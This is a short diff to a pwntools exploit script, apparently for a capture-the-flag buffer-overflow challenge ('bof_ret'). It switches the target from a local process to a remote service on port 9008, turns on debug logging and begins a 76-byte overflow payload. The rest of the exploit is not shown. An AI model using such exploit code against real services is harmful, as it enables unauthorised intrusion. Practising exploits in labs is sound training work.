@@ -1,7 +1,9 @@
 from pwn import *
 
-p = process('./bof_ret')
+p=remote('0',9008)
 e = ELF('./bof_ret')
+
+context.log_level="debug"
 
 p.recv()
 payload = 'A'*76
